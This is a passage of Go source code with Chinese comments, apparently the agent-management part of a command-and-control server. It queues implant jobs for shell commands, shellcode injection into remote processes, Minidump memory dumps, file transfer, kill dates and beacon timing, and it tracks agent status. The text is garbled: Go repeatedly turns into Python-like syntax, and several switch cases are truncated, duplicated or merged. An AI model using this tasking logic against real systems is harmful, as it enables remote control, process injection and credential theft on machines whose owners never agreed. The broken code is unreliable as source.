	m.Padding = core.RandStringBytesMaskImprSrc(Agents[agentID].PaddingMax)
	// 根据作业类型设置消息类型
	switch job.Type {
	case "cmd","cmdScriptFromPath":
		// 如果作业类型为"cmd"，设置消息类型为"CmdPayload"
		if job.Type == "cmd"{
			m.Type = "CmdPayload"
		}else {
			// 否则设置消息类型为"CmdPayloadScriptFromPath"
			m.Type = "CmdPayloadScriptFromPath"
		}
		// 创建命令载荷
		p := messages.CmdPayload{
			Command: job.Args[0],
			Job:     job.ID,
		}
		// 如果作业参数数量大于1，将参数连接成字符串
		if len(job.Args) > 1 {
			p.Args = strings.Join(job.Args[1:], " ")
		}
		// 设置消息载荷
		m.Payload = p
	case "cmdgo":
		// 如果作业类型为"cmdgo"，设置消息类型为"CmdGoPayload"
		m.Type = "CmdGoPayload"
		// 创建一个消息载荷结构体，包含命令和作业ID
		p := messages.CmdPayload{
			Command: job.Args[0],
			Job:     job.ID,
		}
		// 设置消息载荷结构体的参数数组为作业参数列表中除第一个参数外的所有参数
		p.ArgsArray = job.Args[1:]
		// 将消息的载荷设置为新创建的消息载荷结构体
		m.Payload = p
	case "cmdgoprogress":
		// 设置消息类型为CmdGoProgressPayload
		m.Type = "CmdGoProgressPayload"
		// 创建一个消息载荷结构体，包含命令和作业ID
		p := messages.CmdPayload{
			Command: job.Args[0],
			Job:     job.ID,
		}
		// 设置消息载荷结构体的参数数组为作业参数列表中除第一个参数外的所有参数
		p.ArgsArray = job.Args[1:]
		// 将消息的载荷设置为新创建的消息载荷结构体
		m.Payload = p
# 根据不同的任务类型进行不同的处理
case "shellcode":
    # 设置消息类型为"Shellcode"
    m.Type = "Shellcode"
    # 创建Shellcode消息对象
    p := messages.Shellcode{
        Method: job.Args[0],  # 设置Shellcode的执行方法
        Job:    job.ID,       # 设置Shellcode的任务ID
    }

    # 根据执行方法不同，设置Shellcode的字节码
    if p.Method == "self":
        p.Bytes = job.Args[1]
    elif p.Method == "remote" || p.Method == "rtlcreateuserthread" || p.Method == "userapc":
        # 将字符串类型的进程ID转换为整数类型
        i, err := strconv.Atoi(job.Args[1])
        if err != nil:
            return m, err
        p.PID = uint32(i)  # 设置Shellcode的进程ID
        p.Bytes = job.Args[2]  # 设置Shellcode的字节码
    # 设置消息的载荷为Shellcode对象
    m.Payload = p
case "download":
    # 设置消息类型为"FileTransfer"
    m.Type = "FileTransfer"
		# 记录日志，表示从特定 agent 下载文件
		Log(agentID, fmt.Sprintf("Downloading file from agent at %s\n", job.Args[0]))

		# 创建文件传输消息对象，包含文件位置、作业ID和下载标志
		p := messages.FileTransfer{
			FileLocation: job.Args[0],
			Job:          job.ID,
			IsDownload:   false,
		}
		# 设置消息的载荷为文件传输对象
		m.Payload = p
	case "initialize":
		# 设置消息类型为代理控制
		m.Type = "AgentControl"
		# 创建代理控制消息对象，包含命令和作业ID
		p := messages.AgentControl{
			Command: job.Type,
			Job:     job.ID,
		}
		# 设置消息的载荷为代理控制对象
		m.Payload = p
	case "kill":
		# 设置消息类型为代理控制
		m.Type = "AgentControl"
		# 创建代理控制消息对象，包含命令和作业ID
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}
		// 设置消息类型为 "NativeCmd"
		m.Type = "NativeCmd"
		// 创建本地命令消息结构
		p := messages.NativeCmd{
			Job:     job.ID,  // 设置作业 ID
			Command: job.Args[0],  // 设置命令
		}

		// 如果作业参数数量大于1，设置参数为第二个参数，否则设置参数为当前目录
		if len(job.Args) > 1 {
			p.Args = job.Args[1]
		} else {
			p.Args = "./"
		}
		// 设置消息载荷为本地命令消息结构
		m.Payload = p
	case "killdate":
		// 设置消息类型为 "AgentControl"
		m.Type = "AgentControl"
		// 创建代理控制消息结构
		p := messages.AgentControl{
			Command: job.Args[0],  // 设置命令
			Job:     job.ID,  // 设置作业 ID
		}
		// 如果作业参数的长度为2，将第二个参数赋值给p.Args
		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		// 设置消息类型为"NativeCmd"
		m.Type = "NativeCmd"
		// 创建NativeCmd类型的消息载荷
		p := messages.NativeCmd{
			Job:     job.ID,
			Command: job.Args[0],
			Args:    strings.Join(job.Args[1:], " "),
		}
		// 将消息载荷赋值给消息
		m.Payload = p
	case "cd":
		// 设置消息类型为"NativeCmd"
		m.Type = "NativeCmd"
		// 创建NativeCmd类型的消息载荷
		p := messages.NativeCmd{
			Job:     job.ID,
			Command: job.Args[0],
			Args:    strings.Join(job.Args[1:], " "),
		}
		// 将消息载荷赋值给消息
		m.Payload = p
	case "pwd":
		// 设置消息类型为"NativeCmd"
		m.Type = "NativeCmd"
		// 创建NativeCmd类型的消息载荷
		p := messages.NativeCmd{
			Job:     job.ID,
			Command: job.Args[0],
			Args:    "",
		}
		// 设置消息的类型为 "AgentControl"
		m.Type = "AgentControl"
		// 创建 AgentControl 结构体对象 p，并设置 Command 和 Job 属性
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}

		// 如果 job.Args 的长度为 2，则设置 AgentControl 对象 p 的 Args 属性
		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		// 将 AgentControl 对象 p 赋值给消息的 Payload 属性
		m.Payload = p
	// 当消息类型为 "padding" 时执行以下代码
	case "padding":
		// 设置消息的类型为 "AgentControl"
		m.Type = "AgentControl"
		// 创建 AgentControl 结构体对象 p，并设置 Command 和 Job 属性
		p := messages.AgentControl{
			Command: job.Args[0],
			Job:     job.ID,
		}

		// 如果 job.Args 的长度为 2，则设置 AgentControl 对象 p 的 Args 属性
		if len(job.Args) == 2 {
		// 如果任务类型是"execute"，则设置消息类型为"AgentControl"，并创建AgentControl结构体
		p := messages.AgentControl{
			Command: job.Args[0], // 设置AgentControl结构体的命令字段为任务参数的第一个值
			Job:     job.ID, // 设置AgentControl结构体的作业字段为任务的ID
		}

		// 如果任务参数的长度为2，则设置AgentControl结构体的参数字段为任务参数的第二个值
		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		// 设置消息的载荷为AgentControl结构体
		m.Payload = p
	// 如果任务类型是"skew"，则设置消息类型为"AgentControl"，并创建AgentControl结构体
	case "skew":
		p := messages.AgentControl{
			Command: job.Args[0], // 设置AgentControl结构体的命令字段为任务参数的第一个值
			Job:     job.ID, // 设置AgentControl结构体的作业字段为任务的ID
		}

		// 如果任务参数的长度为2，则设置AgentControl结构体的参数字段为任务参数的第二个值
		if len(job.Args) == 2 {
			p.Args = job.Args[1]
		}
		// 设置消息的载荷为AgentControl结构体
		m.Payload = p
	// 如果任务类型是"sleep"，则设置消息类型为"AgentControl"，并创建AgentControl结构体
	case "sleep":
		p := messages.AgentControl{
			Command: job.Args[0], // 设置AgentControl结构体的命令字段为任务参数的第一个值
			Job:     job.ID, // 设置AgentControl结构体的作业字段为任务的ID
		}
# 如果作业参数的长度为2，则将第二个参数赋值给p.Args
if len(job.Args) == 2:
    p.Args = job.Args[1]

# 设置消息类型为AgentControl
m.Type = "AgentControl"
# 创建AgentControl消息对象
p := messages.AgentControl{
    Command: job.Args[0],
    Job: job.ID,
}

# 如果作业参数的长度为2，则将第二个参数赋值给p.Args
if len(job.Args) == 2:
    p.Args = job.Args[1]
# 将消息载荷设置为AgentControl对象
m.Payload = p

# 如果消息类型为ja3
case "ja3":
    # 设置消息类型为AgentControl
    m.Type = "AgentControl"
    # 创建AgentControl消息对象
    p := messages.AgentControl{
        Command: job.Args[0],
        Job: job.ID,
    }

    # 如果作业参数的长度为2，则将第二个参数赋值给p.Args
    if len(job.Args) == 2:
        p.Args = job.Args[1]
    # 将消息载荷设置为AgentControl对象
    m.Payload = p

# 如果消息类型为Minidump
case "Minidump":
    # 设置消息类型为Module
    m.Type = "Module"
    # 创建Module消息对象
    p := messages.Module{
        Command: job.Type,
		// 设置消息的作业 ID
		m.Job = job.ID
		// 设置消息的作业参数
		m.Args = job.Args
		// 创建一个新的消息载荷
		p := Payload{
			Job:     job.ID,
			Args:    job.Args,
		}
		// 将消息的类型设置为 "FileTransfer"
		m.Type = "FileTransfer"
		// TODO 添加错误处理；检查 2 个参数（源，目标）
		// 读取要上传的文件内容
		uploadFile, uploadFileErr := ioutil.ReadFile(job.Args[0])
		// 如果读取文件出现错误
		if uploadFileErr != nil {
			// TODO 发送 "ServerOK"
			// 返回错误信息
			return m, fmt.Errorf("there was an error reading %s: %v", job.Type, uploadFileErr)
		}
		// 创建一个新的 SHA-256 哈希对象
		fileHash := sha256.New()
		// 将文件内容写入哈希对象
		_, err := io.WriteString(fileHash, string(uploadFile))
		// 如果写入哈希对象出现错误
		if err != nil {
			// 记录警告信息
			message("warn", fmt.Sprintf("There was an error generating file hash:\r\n%s", err.Error()))
		}
		// 记录日志，上传文件的信息
		Log(agentID, fmt.Sprintf("Uploading file from server at %s of size %d bytes and SHA-256: %x to agent at %s",
			job.Args[0],
			len(uploadFile),
		// 计算文件哈希值并将其添加到消息中
		fileHash.Sum(nil),
		job.Args[1]))

		// 创建文件传输消息对象
		p := messages.FileTransfer{
			FileLocation: job.Args[1], // 设置文件位置
			FileBlob:     base64.StdEncoding.EncodeToString([]byte(uploadFile)), // 将文件内容转换为 base64 编码并存储在 FileBlob 字段中
			IsDownload:   true, // 设置为 true，表示代理将下载 FileBlob 字段中提供的文件
			Job:          job.ID, // 设置作业 ID
		}
		m.Payload = p // 将文件传输消息对象添加到消息中
	default:
		m.Type = "ServerOk" // 设置消息类型为 "ServerOk"
		return m, fmt.Errorf("invalid job type: %s, sending ServerOK", m.Type) // 返回错误信息，表示作业类型无效
	}
	return m, nil // 返回消息对象和空错误
}

// GetAgentStatus 评估代理的最后检查时间和最大等待时间，以确定其是否活动、延迟或已停止
func GetAgentStatus(agentID uuid.UUID) string {
	var status string // 定义状态变量
// 如果代理ID不在代理列表中，返回错误信息
if !isAgent(agentID) {
	return fmt.Sprintf("%s is not a valid agent", agentID.String())
}

// 将代理的等待时间转换为持续时间
dur, errDur := time.ParseDuration(Agents[agentID].WaitTime)
if errDur != nil {
	// 如果转换出错，记录警告信息
	message("warn", fmt.Sprintf("Error converting %s to a time duration: %s", Agents[agentID].WaitTime,
		errDur.Error()))
}

// 检查代理的状态是否为活跃
if Agents[agentID].StatusCheckIn.Add(dur).After(time.Now()) {
	status = "Active"
} else if Agents[agentID].StatusCheckIn.Add(dur * time.Duration(Agents[agentID].MaxRetry+1)).After(time.Now()) { // +1 to account for skew
	// 如果代理的状态检查时间加上最大重试次数后仍在当前时间之后，状态为延迟
	status = "Delayed"
} else {
	// 否则状态为死亡
	status = "Dead"
}
return status
}

// RemoveAgent 根据代理ID从代理映射中删除代理对象
func RemoveAgent(agentID uuid.UUID) error {
// 如果代理ID存在，则从代理列表中删除该代理并返回空
if isAgent(agentID) {
	delete(Agents, agentID)
	return nil
}
// 如果代理ID不存在，则返回错误信息
return fmt.Errorf("%s is not a known agent and was not removed", agentID.String())

}

// GetAgentFieldValue 根据指定代理的字段值返回字符串值
func GetAgentFieldValue(agentID uuid.UUID, field string) (string, error) {
	// 如果代理ID存在
	if isAgent(agentID) {
		// 根据字段名进行匹配
		switch strings.ToLower(field) {
		case "platform":
			return Agents[agentID].Platform, nil
		case "architecture":
			return Agents[agentID].Architecture, nil
		case "username":
			return Agents[agentID].UserName, nil
		case "waittime":
			return Agents[agentID].WaitTime, nil
// 检查给定的代理 UUID 是否存在于已实例化代理的映射中，如果存在则返回 true
func isAgent(agentID uuid.UUID) bool {
    // 遍历已实例化代理的映射
    for agent := range Agents {
        // 如果找到给定代理 UUID，则返回 true
        if Agents[agent].ID == agentID {
            return true
        }
    }
    // 如果未找到给定代理 UUID，则返回 false
    return false
}

// 创建一个新的代理对象并返回该对象，但不将其添加到全局代理映射中
func newAgent(agentID uuid.UUID) (agent, error) {
    // 如果处于调试模式，则输出进入 agents.newAgent 函数的调试信息
    if core.Debug {
        message("debug", "Entering into agents.newAgent function")
	}
	// 声明一个变量 agent
	var agent agent
	// 检查是否存在指定的 agent
	if isAgent(agentID) {
		// 如果存在，则返回错误信息
		return agent, fmt.Errorf("the %s agent already exists", agentID)
	}

	// 拼接代理目录的路径
	agentsDir := filepath.Join(core.CurrentDir, "data", "agents")

	// 为新代理的文件创建一个目录
	if _, err := os.Stat(filepath.Join(agentsDir, agentID.String())); os.IsNotExist(err) {
		// 如果目录不存在，则创建目录
		errM := os.MkdirAll(filepath.Join(agentsDir, agentID.String()), 0750)
		if errM != nil {
			// 如果创建目录时出现错误，则返回错误信息
			return agent, fmt.Errorf("there was an error creating a directory for agent %s:\r\n%s",
				agentID.String(), err.Error())
		}
		// 创建代理的日志文件
		agentLog, errC := os.Create(filepath.Join(agentsDir, agentID.String(), "agent_log.txt"))
		if errC != nil {
			// 如果创建日志文件时出现错误，则返回错误信息
			return agent, fmt.Errorf("there was an error creating the agent_log.txt file for agnet %s:\r\n%s",
				agentID.String(), err.Error())
		}

		// Change the file's permissions
		// 更改文件的权限
		errChmod := os.Chmod(agentLog.Name(), 0600)
		// 使用os.Chmod函数更改文件权限为0600
		if errChmod != nil {
			// 如果更改权限出错，返回错误信息
			return agent, fmt.Errorf("there was an error changing the file permissions for the agent log:\r\n%s", errChmod.Error())
		}

		if core.Verbose {
			// 如果设置了Verbose标志，输出日志信息
			message("note", fmt.Sprintf("Created agent log file at: %s agent_log.txt",
				path.Join(agentsDir, agentID.String())))
		}
	}
	// Open agent's log file for writing
	// 打开代理的日志文件以便写入
	f, err := os.OpenFile(filepath.Clean(filepath.Join(agentsDir, agentID.String(), "agent_log.txt")), os.O_APPEND|os.O_WRONLY, 0600)
	// 使用os.OpenFile函数打开文件，以追加写入模式和只写模式打开，权限为0600
	if err != nil {
		// 如果打开文件出错，返回错误信息
		return agent, fmt.Errorf("there was an error openeing the %s agent's log file:\r\n%s", agentID.String(), err.Error())
	}

	agent.ID = agentID
	// 设置agent的ID属性为agentID
	# 设置 agent 的日志文件
	agent.agentLog = f
	# 设置 agent 的初始检查时间为当前时间的 UTC 格式
	agent.InitialCheckIn = time.Now().UTC()
	# 设置 agent 的状态检查时间为当前时间的 UTC 格式
	agent.StatusCheckIn = time.Now().UTC()
	# 创建一个容量为 10 的通道
	agent.channel = make(chan []Job, 10)

	# 将当前时间和实例化 agent 的信息写入 agent 的日志文件
	_, errAgentLog := agent.agentLog.WriteString(fmt.Sprintf("[%s]%s\r\n", time.Now().UTC().Format(time.RFC3339), "Instantiated agent"))
	# 如果写入日志文件时出现错误，则记录错误信息
	if errAgentLog != nil {
		message("warn", fmt.Sprintf("There was an error writing to the agent log agents.Log:\r\n%s", errAgentLog.Error()))
	}

	# 如果处于调试模式，则记录离开 agents.newAgent 函数的信息
	if core.Debug {
		message("debug", "Leaving agents.newAgent function without error")
	}
	# 返回实例化的 agent 和 nil 错误
	return agent, nil
}

// JobResults 处理 agent 发送的响应消息
func JobResults(m messages.Base) error {
	# 如果处于调试模式，则记录进入 agents.JobResults 函数的信息
	if core.Debug {
		message("debug", "Entering into agents.JobResults")
```

	}

	// 检查以确保它是一个已知的代理
	if !isAgent(m.ID) {
		return fmt.Errorf("%s is not a known agent", m.ID)
	}

	// 检查以确保它是该代理的真实工作
	p := m.Payload.(messages.CmdResults)
	Log(m.ID, fmt.Sprintf("Results for job: %s", p.Job))

	// 发送成功消息，包括代理ID、工作ID和时间信息
	message("success", fmt.Sprintf("Results for %s job %s at %s", m.ID, p.Job, time.Now().UTC().Format(time.RFC3339)))

	// 如果标准输出不为空，记录标准输出结果并发送消息
	if len(p.Stdout) > 0 {
		Log(m.ID, fmt.Sprintf("Command Results (stdout):\r\n%s", p.Stdout))
		message("plain", color.GreenString("%s", p.Stdout))
	}
	// 如果标准错误不为空，记录标准错误结果
	if len(p.Stderr) > 0 {
		Log(m.ID, fmt.Sprintf("Command Results (stderr):\r\n%s", p.Stderr))
```
	// 使用红色打印标准错误信息
	message("plain", color.RedString("%s", p.Stderr))
	}

	// 如果调试模式开启，打印调试信息
	if core.Debug {
		message("debug", "Leaving agents.JobResults")
	}
	fmt.Println()
	return nil
}

// FileTransfer 处理文件上传/下载操作
func FileTransfer(m messages.Base) error {
	// 如果调试模式开启，打印调试信息
	if core.Debug {
		message("debug", "Entering into agents.FileTransfer")
	}

	// 检查是否为已知代理
	if !isAgent(m.ID) {
		return fmt.Errorf("%s is not a known agent", m.ID)
	}
	# 将消息的载荷转换为文件传输对象
	p := m.Payload.(messages.FileTransfer)

	# 如果是下载操作，获取代理目录的路径
	if p.IsDownload {
		agentsDir := filepath.Join(core.CurrentDir, "data", "agents")
		# 获取文件路径中的文件名部分
		_, f := filepath.Split(p.FileLocation) // We don't need the directory part for anything
		# 检查代理目录是否存在，如果不存在则返回错误信息
		if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
			errorMessage := fmt.Errorf("there was an error locating the agent's directory:\r\n%s", errD.Error())
			Log(m.ID, errorMessage.Error())
			return errorMessage
		}
		# 记录成功消息
		message("success", fmt.Sprintf("Results for %s job %s at %s", m.ID, p.Job, time.Now().UTC().Format(time.RFC3339)))
		# 解码文件数据
		downloadBlob, downloadBlobErr := base64.StdEncoding.DecodeString(p.FileBlob)

		# 如果解码出错，返回错误信息
		if downloadBlobErr != nil {
			errorMessage := fmt.Errorf("there was an error decoding the fileBlob:\r\n%s", downloadBlobErr.Error())
			Log(m.ID, errorMessage.Error())
			return errorMessage
		}
		# 获取下载文件的路径
		downloadFile := filepath.Join(agentsDir, m.ID.String(), f)
		// 使用 ioutil.WriteFile 将下载的文件数据写入指定的文件路径，权限为 0600
		writingErr := ioutil.WriteFile(downloadFile, downloadBlob, 0600)
		// 如果写入过程中出现错误，记录错误信息并返回错误
		if writingErr != nil {
			errorMessage := fmt.Errorf("there was an error writing to -> %s:\r\n%s", p.FileLocation, writingErr.Error())
			Log(m.ID, errorMessage.Error())
			return errorMessage
		}
		// 如果写入成功，记录成功信息并返回成功消息
		successMessage := fmt.Sprintf("Successfully downloaded file %s with a size of %d bytes from agent %s to %s",
			p.FileLocation,
			len(downloadBlob),
			m.ID.String(),
			downloadFile)

		message("success", successMessage)
		Log(m.ID, successMessage)
	}
	// 如果处于调试模式，记录调试信息
	if core.Debug {
		message("debug", "Leaving agents.FileTransfer")
	}
	// 返回空值表示没有错误
	return nil
}
// GetLifetime函数返回一个代理在没有成功与服务器通信的情况下能够存活的时间
func GetLifetime(agentID uuid.UUID) (time.Duration, error) {
	// 如果处于调试模式，则输出进入agents.GetLifeTime的调试信息
	if core.Debug {
		message("debug", "Entering into agents.GetLifeTime")
	}
	// 检查代理是否已知
	if !isAgent(agentID) {
		return 0, fmt.Errorf("%s is not a known agent", agentID)
	}

	// 检查PID是否已设置，以确定第一个AgentInfo消息是否已发送
	if Agents[agentID].Pid == 0 {
		return 0, nil
	}

	// 将代理的等待时间解析为持续时间
	sleep, errSleep := time.ParseDuration(Agents[agentID].WaitTime)
	if errSleep != nil {
		return 0, fmt.Errorf("there was an error parsing the agent WaitTime to a duration:\r\n%s", errSleep.Error())
	}
}
# 如果睡眠时间为0，则返回错误信息
if sleep == 0:
    return 0, fmt.Errorf("agent WaitTime is equal to zero")

# 获取代理的最大重试次数
retry := Agents[agentID].MaxRetry
if retry == 0:
    return 0, fmt.Errorf("agent MaxRetry is equal to zero")

# 获取代理的时间偏差，并转换为毫秒
skew := time.Duration(Agents[agentID].Skew) * time.Millisecond
maxRetry := Agents[agentID].MaxRetry

# 计算代理在死亡之前最长的存活时间
lifetime := sleep + skew
for maxRetry > 1:
    lifetime = lifetime + (sleep + skew)
    maxRetry--

# 如果代理的终止日期大于0，则执行以下操作
if Agents[agentID].KillDate > 0:
// 如果当前时间加上生命周期超过了代理程序的终止日期，则返回错误
if time.Now().Add(lifetime).After(time.Unix(Agents[agentID].KillDate, 0)) {
    return 0, fmt.Errorf("the agent lifetime will exceed the killdate")
}

// 如果启用了调试模式，则输出调试信息
if core.Debug {
    message("debug", "Leaving agents.GetLifeTime without error")
}

// 返回生命周期和空错误
return lifetime, nil
}

// Job 是一个结构，用于保存分配给单个代理程序的单个任务的数据
type Job struct {
    ID      string
    Type    string
    Status  string // 有效的状态包括 created, sent, returned //TODO 这可能不是必要的
    Args    []string
    Created time.Time
}
这是一个代码块的结束标记，表示前面的函数或者循环的结束。
```